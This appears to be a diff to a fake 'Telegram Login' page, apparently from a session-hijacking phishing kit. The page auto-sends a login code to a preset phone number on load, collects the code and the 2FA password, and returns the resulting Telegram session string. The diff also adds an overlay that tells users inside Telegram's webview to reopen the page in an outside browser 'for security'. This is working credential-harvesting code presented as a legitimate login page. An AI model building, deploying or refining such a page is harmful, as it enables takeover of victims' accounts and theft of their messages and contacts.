@@ -5,7 +5,7 @@
   <title>Telegram Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f0f2f5; }
+    body { font-family: sans-serif; margin: 0; padding: 20px; background: #f0f2f5; }
     .card { max-width: 400px; margin: 40px auto; background: white; padding: 24px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
     input, button { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
     button { background: #229ED9; color: white; border: none; font-weight: bold; cursor: pointer; }
@@ -27,36 +27,23 @@
     <p id="status"></p>
   </div>
 
-  <!-- OPEN IN BROWSER BANNER -->
+  <!-- ONLY SHOW BANNER IN TELEGRAM WEBVIEW -->
   <script>
     if (window.Telegram?.WebApp?.initData) {
       const banner = document.createElement('div');
-      banner.style.cssText = `
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: #000000ee; color: white; z-index: 9999;
-        display: flex; flex-direction: column; justify-content: center;
-        align-items: center; text-align: center; padding: 20px;
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      `;
+      banner.style = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;z-index:9999;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;font-family:sans-serif;';
       banner.innerHTML = `
-        <h1 style="font-size: 24px; margin-bottom: 16px;">Open in Browser</h1>
-        <p style="max-width: 80%; margin-bottom: 32px; line-height: 1.5;">
-          For security, please open this page in <strong>Chrome</strong> or <strong>Safari</strong>.
-        </p>
-        <button onclick="openInBrowser()" style="
-          background: #229ED9; color: white; border: none; padding: 16px 36px;
-          font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer;
-        ">Open in Browser</button>
+        <h2>Open in Browser</h2>
+        <p>For security, tap below to open in Chrome/Safari</p>
+        <button onclick="window.location.href=window.location.href; setTimeout(()=>window.open(window.location.href,'_blank'),500)" 
+                style="background:#229ED9;color:white;border:none;padding:14px 30px;font-size:18px;border-radius:12px;cursor:pointer;font-weight:bold;">
+          Open in Browser
+        </button>
       `;
       document.body.appendChild(banner);
       document.body.style.overflow = 'hidden';
-
-      function openInBrowser() {
-        window.location.href = window.location.href;
-        setTimeout(() => window.open(window.location.href, '_blank'), 600);
-      }
     } else {
-      // EXTERNAL BROWSER: RUN LOGIN LOGIC
+      // === YOUR ORIGINAL AUTO-SEND LOGIC ===
       const phone = "{{ phone }}";
       const status = document.getElementById('status');
       const sendBtn = document.getElementById('sendBtn');
@@ -64,6 +51,9 @@
       const verifyBtn = document.getElementById('verifyBtn');
       const pwdField = document.getElementById('pwdField');
       const pwdInput = document.getElementById('pwd');
+
+      // AUTO SEND CODE ON LOAD
+      setTimeout(() => sendBtn.click(), 800);
 
       sendBtn.onclick = async () => {
         const res = await fetch('/send', {
@@ -83,20 +73,17 @@
       };
 
       verifyBtn.onclick = async () => {
-        const code = codeInput.value;
-        const pwd = pwdInput.value;
-        const body = `phone=${encodeURIComponent(phone)}&code=${encodeURIComponent(code)}`;
-        const res = await fetch('/verify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: pwd ? body + `&pwd=${encodeURIComponent(pwd)}` : body
-        });
+        const code = codeInput.value.trim();
+        if (!code) return;
+        const body = `phone=${encodeURIComponent(phone)}&code=${encodeURIComponent(code)}` + 
+                     (pwdInput.value ? `&pwd=${encodeURIComponent(pwdInput.value)}` : '');
+        const res = await fetch('/verify', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body });
         const data = await res.json();
         if (data.session) {
-          status.innerHTML = `<pre>${data.session}</pre><button onclick="navigator.clipboard.writeText('${data.session}')">Copy Session</button>`;
+          status.innerHTML = `<pre>${data.session}</pre><button onclick="navigator.clipboard.writeText('${data.session}')">Copy</button>`;
         } else if (data.needs_password) {
           pwdField.style.display = 'block';
-          status.textContent = "2FA enabled. Enter password.";
+          status.textContent = "2FA: Enter password.";
         } else {
           status.textContent = "Error: " + data.error;
         }
